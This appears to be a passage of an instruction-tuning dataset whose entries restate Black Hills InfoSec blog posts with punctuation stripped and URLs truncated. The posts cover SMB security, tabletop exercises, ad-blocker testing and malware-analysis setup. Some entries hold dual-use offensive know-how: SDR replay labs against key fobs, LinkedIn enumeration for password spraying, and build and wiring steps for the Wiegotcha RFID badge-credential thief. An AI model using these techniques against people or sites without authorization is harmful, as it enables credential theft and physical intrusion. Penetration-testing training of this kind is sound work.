        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Small and Medium Business Security Strategies: Part 1</title>\n<taxonomies>Author, Blue Team, How-To, Jordan Drysdale, Critical Controls, it security, Jordan Drysdale, Small Business, Small Business Security</taxonomies>\n<creation_date>Wed, 20 Dec 2017 15:30:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Blurb A few of us have discussed the stress that small and medium business proprietors and operators feel these days We want to help stress you out even more Not really but if you aren't worrying about IT security you are probably doing it wrong This series will run through some of the important controls that IT pros have mapped out for us We are trying to present these in a way that you can accomplish them without dedicated IT staff We're all facing a fairly challenging landscape hackers seemingly making shambles of enterprise network defenses nation-state actors stealing secrets from each other and the constant concerns we have about our data privacy How in the world is a small business expected to defend itself against a nation-state What about a rogue employee Most of us at BHIS have spent time as the front line defenders of networks of various sizes Defending small networks will boil down to a few steps really just the first five critical controls to get started There is a lot of technical lingo and information about the Critical Controls here Getting your organization headed in the right direction requires starting a conversation with your staff Once this conversation is started you need to keep it going The human element of IT security is left off the critical controls checklists and should be first Secure firms understand Information Security and how it pertains to each employee Each individual feels responsible The five basic controls to get your network to a basic level of security look like this Hardware Inventory Software Inventory Secure Configurations This may be the most difficult step Vulnerability Assessment and Remediation Limiting Admin Privilege This look is to be expected at this point You might be asking something along these lines What are secure configurations How can I possibly understand Limited Admin Privilege Seriously what is vulnerability assessment and remediation We are going to start slow set realistic goals and will work together to get your network under control So where to from here No one has time no one wants extra duties and everyone has to step in and participate Based on experience most offices businesses schools et cetera have someone around who knows about computers This person is usually the go-to resource for broken printers blue screened workstations and internet outages This person is an asset and should serve as a guide for this process They can answer questions and will definitely know what a modem switch and router looks like Next up in the series Part Two inventory Let's put together a list of systems network gear and the people responsible for them"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Holiday Tale of Two Teams: The Blue Team Barbie & Red Team Elf on the Shelf saga</title>\n<taxonomies>Fun & Games, Blue Team, Blue Team Barbie, Christmas Toys, Elf on the Shelf, fun and games, infosec, Red Team, Red Team Elf on the Shelf</taxonomies>\n<creation_date>Fri, 22 Dec 2017 16:55:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Staff Thanks to everyone for all the good ideas We had so much fun with this and hopefully it made you laugh as much as we did Happy December Follow along for some BHIS Christmas Fun with Blue Team Barbie vs Red Team Elf on the Shelf Red Team Elf on the Shelf snuck into his gifts a little early this year Who knows what mischief will follow After reading about Mike and Beau's Google calendar exploits Blue Team Barbie implemented Yubikeys for herself and her entire team Red Team Elf on the Shelf just won't stop Looks like Blue Team Barbie has installed NoScript throughout the office though On the 4th day of Christmas Red Team Elf on the Shelf tried to use four lock picks three fake badges and two cover stories that STILL didn't get past Blue Team Barbie who takes physical security very seriously Red Team Elf on the Shelf decided to take a break and do a little reading over the weekend It will be an interesting week for Blue Team Barbie I'm sure Blue Team Barbie caught the flu and is stuck in bed but she can still read up Surely her team can handle a day without her right Someone from Blue Team Barbie's company was kind enough to hold the door for Red Team Elf on the Shelf and he was in Timing is everything Now to sneak away He decided it was best to stay incognito since Blue Team Barbie had already spotted him on the security camera so he fashioned a hacker bandit mask for minimal detection Red Team Elf on the Shelf found the server room This can't be good After KonBooting he also left behind a dropbox Which of Blue Team Barbie's active defenses will catch it Port based security kept Red Team Elf on the Shelf contained It looks like that nasty elf used a drop box that sent multiple DNS requests to untrusted hosts This triggered alerts and sure enough when Blue Team Barbie was back from sick leave she checked her RITA console and found it had flagged beacon behavior Blue Team Barbie always finds time to educate her team about basic best practices through weekly brown bag lunches This week Blue Team Barbie decided a refresher about good password usage might be useful which especially important since she suspects their company is under attack Red Team Elf on the Shelf has dropped various USB sticks with malware on them in the parking lot hoping that someone will be curious enough to plug them in Blue Team Barbie knows the best plan of attack is to destroy them on site Red Team Elf on the Shelf has finished the pentest of Blue Team Barbie's company They did great After going over the report to show some ways they could stay strong remind people about tailgating and suspicious looking characters in bandit masks the company was awarded the coveted Honey Badger Award for excellent security posture Now that the pentest is over Blue Team is at home starting her holiday break and Red Team Elf on the Shelf is excited to finally get to play the Holiday Hack challenge What fun things you going to do over your holiday Thanks for following Blue Team Barbie and Red Team Elf on the Shelf's holiday shenanigans Tune in again next December"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Dungeons & Dragons, Meet Cubicles & Compromises</title>\n<taxonomies>Author, Blue Team, John Strand, Cubicles and Compromises, Dungeons and Dragons, Incident Response, Table Top</taxonomies>\n<creation_date>Thu, 21 Dec 2017 18:33:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand Lately we've been running a very cool game with a few of our customers There's been some demand for incident response table top exercises For the most part these are not fun events I've sat through more than a few stuffy meetings where people walk through an incident and then comb through polices processes and procedures Gah Often there are dry arguments about whether or not a procedure is sufficient or if X technology would really work the way it is should More often than not people get angry and hurt and very little changes When the whole event is over most involved don't ever want to do it again It's like slamming your hand in a car door slightly interesting but mostly just painful We didn't want to do our table tops this way Cause we like to have fun and not leave customers in tears Instead we started incorporating a little bit of randomness into the process with you guessed it a 20-sided dice cause we're cool like that The key is not to make it too complex I understand there are going to be lots of people who insist there should be super duper complicated rules that require years of practice and memorization to get right These people also tend to be the people who love D D but want to fight for hours over meaningless details instead of moving a narrative forward Despite appearances these people are not your friends and should be avoided at all costs That is not how you roll for Magic Missile Growing up the best D D games were the ones where the dungeon master moved the story forward They were willing to simplify and bend the rules for the sake of the story THAT is what we're doing here UPDATE The printable version can be found here www.blackhillsinfosec.com cubicles-compromises-printable The Rules dead simple For every action your IR team takes you roll the 20-sided dice If the roll is 11-20 the action is successful If it is ten or under it fails Ka-pow You get a 5 modifier if your organization has documented procedures for the action You get a 2 modifier if your organization has someone trained to do that action At random intervals the IT Guru Master Yes this role might need a better name gets to inject a random into the game It will help if the IGM has some pen testing experience Below are some examples -The attacker posts the incident data on Pastebin.-Bobby the intern kills the system you are reviewing.-It was a blackbox pen-test hired by the CEO You can sleep well.-Legal takes your only skilled handler into a meeting to explain the incident.-Lead handler's wife has a baby.-An unrelated DDoS attack breaks out.Feel free to add more If at any point the team tries to take an action and there are no policies or anyone trained someone should note that as a gap to be addressed That's it Quick Run Through So let's take a starting incident and walk through a couple of action rounds IT Guru Master IGM Monday morning the fog clears through the assistance of black coffee You receive an email ticket from the help desk that a user reported an AV alert pop up The help desk technician failed to note the name of the malware What do you do?Tech 1 We would go and review that system to see if there are any strange processes IGM Do you have procedures for live systems forensics?Tech 1 No IGM Is anyone trained in live systems forensics?Tech 1 No IGM Please roll Tech 1 rolls a 3 IGM The action fails Please note the lack of procedures and training in live systems forensics IGM The AV only caught the stager for the malware it did not detect the memory injection stage The malware is running on this workstation The attacker then attempts to pivot from the infected workstation to another workstation Does your team have host based firewalls enabled on workstations Tech 1 We do IGM Do you have the alerts forwarded to a SIEM Tech 1 We do IGM Are there procedures for reviewing and clearing alerts after they have been resolved And are team members trained to do this Tech 1 We do And yes IGM Please roll The Tech 1 rolls a 7 the 5 for the procedures and the 2 for the training takes the roll to a 14 IGM You have detected the lateral movement What is your next action Tech 1 We would isolate that system IGM Do you have procedures for system isolation Tech 1 We do and we are trained IGM Please roll Tech 1 rolls a 13 IGM You have successfully isolated the system However it is now time for an inject The attacker has posted some sensitive HR data from that system to Pastebin A customer found it via Google What is your next step Tech 1 We would immediately pass this information to management IGM Management what is your next action Manager 1 We would immediately contact the customer to get additional details and we would contact Pastebin to request the information be removed And on it goes The goal is to work through as many incidents as possible to identify gaps in training and procedures If you want an added bit of fun have the Red Team play the part of the attacker s The rules for them are simple every action they take is a simple over ten roll to be successful No modifiers If you think this is mean you've never been a pentester This is more than generous The IGM can modify and add rolls for different actions being successful as they see fit Let's say the attacker dumps passwords If the company still has LanMan the IGM will require a roll of two or greater to be successful If the passwords are NT and a minimum of 20 characters the IGM would require a roll over 18 to crack a password That's just one example I like to use Please feel free to change and add however you see fit to make the game more interesting or applicable to your business We'll schedule a webcast soon where we play a round or two to help everyone get a feel for this It's much more fun than slamming your hand in the car door Happy Holidays John"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Small and Medium Business Security Strategies: Part 2</title>\n<taxonomies>Author, How-To, InfoSec 201, Jordan Drysdale, it security, Jordan Drysdale, Small Business, SMB InfoSec Controls</taxonomies>\n<creation_date>Wed, 03 Jan 2018 14:42:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale A few of us have discussed the stress that small and medium business proprietors and operators feel these days We want to help stress you out even more Not really but if you aren't worrying about IT security you are probably doing it wrong This series will run through some of the important controls that IT pros have mapped out for us We are trying to present these in a way that you can accomplish them without dedicated IT staff To start from the beginning of this series Part 1 Introduction to SMB InfoSec Controls Part 2 Inventory The first piece of the puzzle is sitting down and understanding at a minimal or conceptual level what it takes to keep your organization's IT infrastructure operational Do you have a modem and a phone line Who do you call if service drops Finding answers to these questions should help you sleep a little better at night That said there are a lot more of these questions specific to inventory controls Do you have an off the shelf device from an outlet store connected to your modem Do you know the password or who configured it Do you know what a router is As the proprietor of any business it is your job to delegate ownership of network inventory to someone you trust if you are not doing it yourself Taking Inventory Spreadsheet Framework for Inventory Management There should be a separate spreadsheet for servers laptops and workstations similar to the following Now it's time to call a staff meeting The purpose of this meeting is to help people understand that throughout the calendar year of 2018 the company will be transitioning and everyone is going to play a role Ask your staff if they have had their identity stolen Ask them if they are worried about hacking Some of your employees will answer yes to the first and most to the second Delegation Let's delegate some tasks First find the person with the most knowledge about systems and computers This person gets to take a crack at the telecommunications area They need to document the modem any switches routers firewalls wireless devices et cetera Next each member of your team will need to provide the details of their system to the spreadsheet owner Network Configuration There are at least a million unique ways to install and configure a small network There is a very good chance your network may exist outside even these unique configurations As a previous member of a 'managed services team it is very possible that you paid someone else to install configure and troubleshoot your network It is also very possible that these folks are still in charge of your network Here's a very strong case for managed services Networks are complex and hard to manage Without dedicated IT staff it can be a nightmare to manage yourself For a thousand bucks or so a month having a dedicated team to answer trouble calls and show up when things are broken this absolutely crushes the ROI of an FTE Assuming you have a dedicated IT FTE for even mildly complex networks it is nearly impossible to know everything Last it so much easier to let someone else worry about these things Let's look at the last bullet here Let someone else worry about your network This in itself is a dream and should be far from reality Contact your managed services provider now and ask for an inventory of your networking gear Follow up with a second request for the inventory spreadsheet of your servers workstations and laptops If they don't provide this in a timely fashion it likely means they don't have it This demonstrates a flaw in their management of your network So with a couple of spreadsheets and a plan you too can maintain an accurate inventory of your network hardware Your staff can help ease the burden and should feel empowered to do so The goal is not to run your business like Amazon runs its warehouses but maybe someday Next up in series we'll cover some of the software inventory strategies that can help you finish out the inventory controls from the CSC"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Analyzing Extension Effectiveness with Burp</title>\n<taxonomies>Author, InfoSec 201, Jordan Drysdale, Ad block extensions, AdBlock Plus, Burp, Ghostery, Jordan Drysdale, uBlock Origin</taxonomies>\n<creation_date>Mon, 08 Jan 2018 15:34:24 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr uBlock Origin appears based on non-scientific testing to be fairly effective at keeping trackers from making outbound HTTP GET requests Tested Extensions No Add-ons v Ghostery v uBlock Origin v AdBlock PlusAnalyzed Website homepages CNN v FoxNews v MSNBC I ran all of the following tests about the same I clear my browser cache start a new Burp session and disable the proxy intercept Via Kali Linux the following Firefox version First up CNN I started this analysis with a straight and clean load of CNN.com with no extensions or add-ons enabled CNN's site generated 335 HTTP GET requests in 60 seconds The next run is against CNN with the Ghostery extension This combination generated 132 requests in 60 seconds The third test against CNN with the uBlock Origin extension finally choked on You're running an AdBlocker and asked to be whitelisted 102 GET requests and a soft adblock wall The last test for CNN was with the AdBlock Plus extension In all 99 GET requests and no adblock wall weird Next up FoxNews I cleared the browser cache launched a new Burp session and disabled intercept At first run with no extensions or add-ons running there were 265 GET requests in 60 seconds Certain elements of Fox's site absolutely broke with Ghostery enabled I entered the URL a second time and only got about 67 HTTP GET requests through the proxy So they are running something in the background that is reliant possibly on a CDN that the Ghostery crew has deemed irresponsible The second extension test against Foxnews.com was with uBlock origin and I ended up with 170 GET requests AdBlock Plus was ineffective against the trackers and ad-network scripts on Foxnews.com We were back up to 229 GET requests with the AdBlock Plus extension Last on the list MSNBC As usual I cleared the browser cache started a new Burp session and disabled intercept A clean load of msnbc.com generated 301 requests in 60 seconds with no extensions or add-ons running The first extension test with Ghostery enabled generated 136 GET requests in 60 seconds With uBlock enabled we were down to 85 requests Finally and the last extension tested AdBlock was basically ineffective against MSNBC's tracking networks We were back up to 140 GET requests It looks like most ad and tracking networks have adjusted to the methods used by the AdBlock Plus extensions to squelch their noise Ghostery performed fairly well and included some interesting data about the trackers Overall uBlock Origin did the best at halting the dissemination of information about my browser browsing habits operating system installed extensions and browser fingerprint Panopticlick confirmed that things looked pretty reasonable from a tracking perspective running just uBlock My opinions are mine and may not align directly with BHIS I support the EFF DuckDuckGo the uBlock team PrivacyBadger and the Ghostery crew"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wild West Hackin' Fest (WWHF) SDR Labs</title>\n<taxonomies>Author, David Fletcher, How-To, Keeloq FOB, Labs, SDR, Software Defined Raid, Wild West Hackin' Fest</taxonomies>\n<creation_date>Wed, 10 Jan 2018 16:15:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher During WWHF we had a number of attendees ask for the Software Defined Radio SDR lab parts list and source code so that they could experiment at home Unfortunately I needed to make some modifications to the lab write up and source code based on observations made during the conference and I have had little time to do so between then and now I feel bad for the delay but here they are...the WWHF SDR Labs Each lab includes a parts list to get you up and running the lab instructions and the source code used in the lab itself Just download all three files and you'll be on your way Note Parts identified in the parts list do not constitute endorsement they're just what we had Wireless Doorbell Attack Lab This lab demonstrates capture analysis and synthesis of a simple signal used to trigger a wireless doorbell The objective of the lab is to demonstrate manual decode and replay to illustrate the need for replay protection Parts List 1 Wireless Doorbell 16.99 ww.amazon.com Heath-Zenith-DL-6166-Wireless-Doorbell dp B00HDDD9HI ref sr_1_14?ie UTF8 qid 1514386811 sr 8-14 keywords Wireless Doorbell Heathco 1 SDR Dongle RTL-SDR 19.95 ww.amazon.com NooElec-NESDR-Mini-Compatible-Packages dp B009U7WZCA ref sr_1_7?ie UTF8 qid 1514386910 sr 8-7 keywords RTL-SDR 1 YardStick One 123.95 ww.amazon.com YARD-Stick-One-Transceiver-Antenna dp B06Y1RVHBP ref sr_1_1?ie UTF8 qid 1514387023 sr 8-1 keywords Yardstick One Lab Files Handout Script Keeloq FOB Attack Lab This lab demonstrates capture analysis and synthesis of a rolling code signal used to activate an automotive key fob The objective of the lab is to demonstrate manual decode protective properties of rolling code and replay to illustrate out-of-band receipt and replay Parts List 1 Mini Breadboard 5.69 ww.amazon.com Qunqi-point-Experiment-Breadboard-5-5 C3 978-2 C3 970-85cm dp B0135IQ0ZC ref sr_1_2_sspa?ie UTF8 qid 1514397491 sr 8-2-spons keywords mini breadboard psc 1 1 Mini BreadBoard Power Supply 5.49 ww.amazon.com CorpCo-Breadboard-Supply-Arduino-Solderless dp B00ZO9YB1G ref sr_1_1?ie UTF8 qid 1514397662 sr 8-1 keywords ywrobot 1 BreadBoard Jumper Wires 6.29 ww.amazon.com uxcell-Breadboard-Board-Jumper-Cable dp B00W8YFSPI ref sr_1_6?s electronics ie UTF8 qid 1514397832 sr 1-6 keywords breadboard jumper wires 1 2.54 mm Straight Single Row Pin Header Strip 5.59 ww.amazon.com OdiySurveil-2-54mm-Straight-Single-Header dp B00UVPT5RI ref sr_1_1?s electronics ie UTF8 qid 1514401373 sr 1-1 keywords breadboard headers 2 PiStop LED Stop Lights 7.82 hop.pimoroni.com products pistop-traffic-light-add-on-for-raspberry-pi 1 KeeLoq Key FOB System 21.95 ww.circuitspecialists.com rxd4140-434.html 1 SDR Dongle RTL-SDR 19.95 ww.amazon.com NooElec-NESDR-Mini-Compatible-Packages dp B009U7WZCA ref sr_1_7?ie UTF8 qid 1514386910 sr 8-7 keywords RTL-SDR 1 YardStick One 123.95 ww.amazon.com YARD-Stick-One-Transceiver-Antenna dp B06Y1RVHBP ref sr_1_1?ie UTF8 qid 1514387023 sr 8-1 keywords Yardstick One Lab Files Wiring Diagram Handout Script"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Deploy REMnux to the Cloud, Reverse Engineering Malware in the Cloud</title>\n<taxonomies>Author, How-To, John Strand, cloud, REMnux, Reverse Engineering Malware</taxonomies>\n<creation_date>Thu, 01 Feb 2018 15:48:01 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts REMnux is a free virtual machine image with Reverse Engineering Malware tools preinstalled REMnux is maintained by Lenny Zeltser with extensive help from David Westcott and is available from emnux.org I have created an Amazon AMI image from the current version of the image so you can easily create an instance of REMnux in the cloud This is done using the DeployREMnux Python script I developed here Once you enter your Amazon account access keys into the configuration it's as easy as one command python DeployREMnux.py The output of the command above will include the information needed to access your REMnux instance via SSH and RDP Once you connect consider updating REMnux itself using its own update-remnux full command Or if you would like this step done as part of the deployment use the update option when deploying as shown below python DeployREMnux.py -u The following pre-requisites must be met before installing the script This is a Python 2.7 script so you must have Python 2.7 installed and use this version Step 1 Install the Apache libcloud library and other required libraries On Windows install the Microsoft Visual C Compiler for Python 2.7 first pip install apache-libcloud paramiko pycrypto Pip is a Python package manager that comes with Python You will need to install Python v2.7 if not already installed On OS X you may need to install pip On Windows you can find pip.exe in the C Python27 Scripts directory Step 2 Generate an SSH key pair On OS X and Linux this can be done with the ssh-keygen command as shown in the following example ssh-keygen -t rsa -b 4096 On Windows you will be tempted to use the PuTTYgen tool but this causes issues You need to generate the keys with ssh-keygen as shown above You can do this on Linux OS X and copy the keys over Or you could do it from Git Bash on Windows or from the Linux Subsystem on Windows 10 for example You could also generate SSH keys from the Amazon EC2 web console Step 3 Create an Amazon account here Generate access keys as follows Log into your EC2 Console onsole.aws.amazon.com Select your name Security Credentials Expand Access Keys Create New Access Key Record the Access Key ID and the Access Key Step 4 Setup your configuration file A sample configuration file is provided alongside the DeployREMnux script Rename 'DeployREMnux-config.txt.example to 'DeployREMnux-config.txt Enter the AWS key information you generated in step 3 and provide the full file path to your ssh keys generated in step 2 You can optionally configure the password that will be used for RDP access to your instance If no password is specified a random password will be generated AmazonConfig aws_access_key_id put_your_amazon_access_key_id_here aws_secret_access_key put_your_amazon_access_secret_here aws_instance_size t2.micro SshConfig private_key_file root .ssh id_rsa public_key_file root .ssh id_rsa.pub RemnuxConfig remnux_user_password Note that if you are giving Windows paths to your keys files you need to use forward slashes like c path to key id_pub Lastly the configuration file can be used to specify the size of the deployed instance The default is the 't2.micro size which qualifies for the free tier More expensive options are available for improved performance as needed Your instance will be deployed to the us east-1 region a.k.a N Virginia When you are finished using your REMnux instance you can terminate it by pressing Y at the prompt or if you previously entered n use the 'python DeployREMnux.py -t option Where can be determined from the output of the previous command or from the Amazon web console It is a good idea to keep an eye on the Amazon console to ensure that there are no lingering resources that may end up costing money unexpectedly Remember to select the correct region N Virginia using the region selector If need be manually terminate the instance using the web interface Enjoy your disposable REMnux instance in the cloud via Remote Desktop and SSH Like always we're thrilled to have Carrie back as a guest poster"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>I Spy with InSpy</title>\n<taxonomies>Recon, Red Team Tools, InSpy, password spray, recon tool</taxonomies>\n<creation_date>Mon, 05 Feb 2018 15:33:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts Do you ever find yourself on an engagement and need just a few more names with which to conduct a password spray Everyone knows the more emails you have the higher chance of getting in with one of the easy to guess and often used passwords InSpy is a great way to get some names to convert to emails InSpy is authored by Johnathan Broche and was last updated August 24 2018 The following is from ithub.com gojhonny InSpy InSpy is a python based LinkedIn enumeration tool Inspy has two functionalities TechSpy and EmpSpy TechSpy Crawls LinkedIn job listings for technologies used by the provided company InSpy attempts to identify technologies by matching job descriptions to keywords from a new line delimited file EmpSpy Crawls LinkedIn for employees working at the provided company InSpy searches for employees by title and or departments from a new line delimited file InSpy may also create emails for the identified employees if the user specifies an email format Installing and running InSpy is pretty straightforward First clone the repository And then install Running InSpy is pretty easy as well You need to provide the company name and then a wordlist to use InSpy has 2 built in wordlists a large list and a small list Note that the large list does not contain words from the small list If you want to use the built-in lists I recommend running the command twice once with the large list and once with the small list You will get different results Large list output Small list output When I first ran this during a test I gathered almost 200 additional names I noticed there was a Timed out warning I ran the command a second time and got a different number of names returned I am unsure as to why this happened However in preparing for the blog the same thing happened You can see that at different times I got different results Running the command multiple times might yield a larger return Another option is to have InSpy create the list of emails for you This can save a step as you don't have to modify the outfile after you get the list of names Speaking of the outfile you can have the output be in CSV HTML or JSON format For my work .csv is just fine Overall InSpy v3.0 is another useful recon tool"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Are You Spying on me? Detecting SSL Man-in-the-Middle</title>\n<taxonomies>C2, Informational, PowerShell, SSL decrypting</taxonomies>\n<creation_date>Thu, 08 Feb 2018 15:35:48 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Is your employer reading all your sensitive information when you browse the internet from your work computer Probably But how can you be sure It is common for companies to deploy an SSL decrypting proxy at work in an effort to better protect their assets from attack It's something you agree to when you start employment with them at least when you are using their network and their managed devices Even so you may be interested to know what HTTPS traffic they are decrypting and what they are not For example the company might not want to be liable for having access to your banking information including your password or your private information on government .gov websites For this reason a company may configure their proxy to not decrypt information to certain websites while they readily decrypt or Man-in-the-Middle other communications I developed a PowerShell script that will determine if your connection to external servers over HTTPS is being decrypted If you happen to be a pentester you may be especially interested in sites that are not decrypted as you will have better luck getting a Command and Control C2 connection out of the network using Domain Fronting for example if your traffic is not decrypted The Script is called Detect-SSLmitm and is available here Kudos to malcomvetter for the idea to write this script and for some improvement tips For example comparing the intermediate certificate to reduce false positives Running it is very simple as shown in the image below In the output shown the usbank.com and whitehouse.gov sites are the only ones not being decrypted You can edit the script to add any test sites that you like then run the Get-GoldenHashes function to update the list of golden hashes Be sure to generate the Golden certificate hashes from a network location known to not decrypt SSL traffic otherwise you will get false positives Carrie frequently guest posts for BHIS and we're so happy she does"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Gathering Proximity Card Credentials: The Wiegotcha</title>\n<taxonomies>Author, David Fletcher, How-To, Physical, physical pen test, physical pen testing, Physical Pentest, raspberry Pi, RFID, Wiegotcha</taxonomies>\n<creation_date>Mon, 12 Feb 2018 15:29:59 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher There are a number of items that I watch on eBay Included in that group are long-range proximity card readers As it turns out I was recently able to pick up an HID MaxiProx 5375 reader new in box for less than 100 I had to buy it These devices were a centerpiece at Black Hat USA 2014 when Bishop Fox released the Tastic RFID Thief ww.bishopfox.com resources tools rfid-hacking attack-tools ww.youtube.com watch?v 1fszkxcJt7U For those unaware the reader seen below is typically used at gate or garage entrances so proximity cards can be read from a greater distance Depending on the reader configuration and the card being used this distance can be 1-6 feet The Tastic RFID Thief weaponizes this reader by adding a microcontroller Arduino Nano that acts as a door controller and stores credentials read from unsuspecting victims on an SD card for later use in provisioning a duplicate proximity card This activity exposes a lack of encryption and mutual authentication between the card reader and controller My initial goal was to build a Tastic RFID Thief using my newly acquired reader However this proved to be somewhat difficult because the original parts on the Bishop Fox parts list were troublesome to source While searching for suitable replacement parts and researching refactoring the original code for a different microcontroller I came across the Wiegotcha ithub.com lixmk Wiegotcha xfil.co 2017 01 17 wiegotcha-rfid-thief This device takes the Tastic RFID Thief to the next level by replacing the Arduino microcontroller with a Raspberry Pi The Raspberry Pi solution incorporates a wireless access point using hostapd By connecting to the access point using a phone the operator can observe captured credentials real-time using an auto-refreshing web page that displays the card details The parts list for the device is pretty minimal requiring 12 5V Battery Pack Level Shifter Real-Time Clock Jumper Wires Raspberry Pi A fully assembled device using a Raspberry Pi B v1.2 can be seen below The web interface displays captured credentials by the most recent date time and supports searching and download of all credentials in a CSV file Raspbian Jessie is the release supported on the Wiegotcha GitHub repository However my devices are all running Raspbian Stretch just fine I've altered the build instructions from the repo to match my experience with Raspbian Stretch below Manual Installation Mode Manual installation is what I used to get my devices up and running Feel free to explore install.sh and laststep.sh to fully understand what they do Burn a fresh raspbian SD card You can use Stretch or Stretch-lite Run sudo su to become root Run raspi-config and change the default keyboard layout as necessary Ensure that the Git client and ntp are installed apt-get update apt-get install git ntp In root run git cloneithub.com sunfounder SunFounder_RTC_Nano.git Run cd SunFounder_RTC_Nano install.sh The install script will set up the RTC and reboot the device In root run git clone ithub.com lixmk Wiegotcha.git Run cd Wiegotcha install.sh The install script will walk you through everything including a reboot After first reboot run screen -dr install as root Follow instructions to complete final steps of installation Proceed to Hardware Installation Hardware Installation Thorough instructions xfil.co 2017 01 17 wiegotcha-rfid-thief Short version Place the RTC on the RPi's GPIO starting at pin 1 top left going down the left side to pin 9 Run RPi pin 4 to Level Shifter HV in Run RPi pin 6 to Level Shifter LV gnd Run RPi pin 11 to Level Shifter LV 1 Run Rpi pin 12 to Level Shifter LV 4 Run RPi pin 17 to Level Shifter LV in Reader TB1-3 to Battery Ground Black Reader TB1-1 to Battery 12v Red Reader TB2-1 to Level Shifter HV 1 Reader TB2-2 to Level Shifter HV 4 Reader TB1-2 to Level Shifter HV gnd OPTIONAL Remove Speaker OPTIONAL Solder haptic motor The demonstrator above employs the HID MaxiProx 5375 reader which operates at 125 KHz This same setup will work without modification to run the Indala ASR-620 and HID R90 long-range readers The former is also a 125 KHz 